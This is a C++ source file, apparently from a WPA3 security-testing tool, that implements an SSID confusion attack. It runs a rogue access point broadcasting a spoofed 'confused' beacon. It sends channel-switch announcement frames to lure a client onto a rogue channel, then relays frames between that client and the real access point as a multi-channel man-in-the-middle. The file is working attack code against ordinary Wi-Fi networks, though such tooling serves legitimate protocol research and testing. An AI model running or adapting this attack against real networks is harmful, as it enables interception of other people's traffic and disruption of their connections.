#include "attacks/DoS_soft/channel_switch/channel_switch.h"
#include "attacks/DoS_soft/deauth/deauth.h"
#include "attacks/DoS_soft/expected_vht_beacon/expected_vht_beacon.h"
#include "attacks/mc_mitm/mc_mitm.h"
#include "attacks/mc_mitm/ssid_confusion/ssid_helper.h"
#include "attacks/mc_mitm/wifi_util.h"
#include "interrupt.h"
#include "system/hw_capabilities.h"

namespace wpa3_tester::ssid_confusion {
using namespace Tins;
using namespace std;
using namespace chrono;

void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
	rogue_ap->set_iface_up();
    rogue_sta->set_iface_up();

	const auto &att_cfg = rs.config().at("attack_config");
	// scan for real AP beacon on real channel
	setup_real_AP_RSN_frames(att_cfg.at("beacon_timeout_sec"));

    auto confused_beacon = make_confused_beacon(*beacon,
        HWAddress<6>(rogue_ap.get(SK::mac)), netconfig.rogue_channel, confused_ssid);
    probe_resp = std::make_unique<Dot11ProbeResponse>(beacon_to_probe_resp(*confused_beacon, netconfig.rogue_channel));

	csa_frames = CSA_attack::get_CSA_frames(ap.get(SK::mac), netconfig.real_channel, netconfig.rogue_channel, beacon, sta.get(SK::mac), true);
    Dot11Beacon legacy_beacon = expected_vht_beacon_attack::build_legacy_beacon(*beacon);

    // BPF: AP + client traffic only
	const string bpf = //"(type data or type mgt) and "
					"(ether host " + ap.get(SK::permanent_mac) + " or ether host " +
	sta.get(SK::permanent_mac) + " or ether host " + rogue_sta.get(SK::permanent_mac) + " or ether host " +
	rogue_ap.get(SK::permanent_mac) + ")";


	const bool prefer_active = att_cfg.at("prefer_active");
	// rogue channel ACKs: active monitor avoids AP VIF responding to client's SAE auth frames
	setup_ack_iface(rs, rogue_ap, HWAddress<6>(rogue_ap.get(SK::mac)),
		netconfig.rogue_channel, prefer_active, rogue_ap->get_ap_iface(), *confused_beacon);
	//real channel ACKs: rogue_sta uses its own MAC (no spoofing), AP registers real AP as station
	setup_ack_iface(rs, rogue_sta, HWAddress<6>(rogue_sta.get(SK::mac)),
		netconfig.real_channel, prefer_active, rogue_sta->get_ap_iface(), *beacon);

	sock_real = make_unique<MonitorSocket>(rogue_sta.get(SK::iface), rogue_sta[SK::netns]);
	sock_rogue = make_unique<MonitorSocket>(rogue_ap.get(SK::iface), rogue_ap[SK::netns]);
	sock_real->set_filter(bpf);
	sock_rogue->set_filter(bpf);

    rs.start_observers(ObserverRunPolicy::SKIP);
    rs.process_manager.write_log_all(ATTACK_START_tag);

    const auto start      = steady_clock::now();
    auto next_beacon      = steady_clock::now();
    const uint64_t confused_beacon_ts0 = confused_beacon->timestamp();

    while(true) {
        if(steady_clock::now() > start + seconds(timeout_sec)) {
            log(LogLevel::INFO, "Attack timeout");
            break;
        }

    	const int fd_real = pcap_get_selectable_fd(sock_real->get_pcap_handle());
    	const int fd_rogue = pcap_get_selectable_fd(sock_rogue->get_pcap_handle());

    	fd_set read_fds;
        FD_ZERO(&read_fds);
        FD_SET(fd_real, &read_fds);
        FD_SET(fd_rogue, &read_fds);
        const auto us_to_beacon = duration_cast<microseconds>(next_beacon - steady_clock::now()).count();
        timeval tv{ 0, (max<long>(0, min<long>(us_to_beacon, 100'000))) };
        select(max(fd_real, fd_rogue) + 1, &read_fds, nullptr, nullptr, &tv);

    	// real_channel: frames from WrongNet AP -> relay to client on ch rogue_channel (translate BSSID)
    	if(FD_ISSET(fd_real, &read_fds)) {
    		while(auto recv_res = sock_real->recv()) handle_rx_real_chan(recv_res.pdu, recv_res.raw);
    	}
    	// ch rogue_channel: frames from confused client -> relay to real AP on real_channel (translate BSSID back)
    	if(FD_ISSET(fd_rogue, &read_fds)) {
    		while(auto recv_res = sock_rogue->recv()) handle_rx_rogue_chan(recv_res.pdu, recv_res.raw);
    	}

		if(next_beacon <= steady_clock::now()) {
            sock_real->log_drops("sock_real");
            sock_rogue->log_drops("sock_rogue");
            confused_beacon->timestamp(confused_beacon_ts0 +
                static_cast<uint64_t>(duration_cast<microseconds>(steady_clock::now() - start).count()));
            send_to_rogue(*confused_beacon);
            if(client_state.get_state() < ClientState::GotMitm) {
                CSA_attack::update_time_CSA_frames(csa_frames);
            	for(auto &csa_frame : csa_frames) {
            		send_to_real(csa_frame);
            		//interruptible_sleep(milliseconds(100)); //TODo
            	}
            }
            next_beacon += milliseconds(beacon_ms);
        }
    }
    rs.process_manager.write_log_all(ATTACK_STOP_tag);
	stop_ap(rogue_ap->get_ap_iface(), rogue_ap[SK::netns]);
	stop_ap(rogue_sta->get_ap_iface(), rogue_sta[SK::netns]);

}

}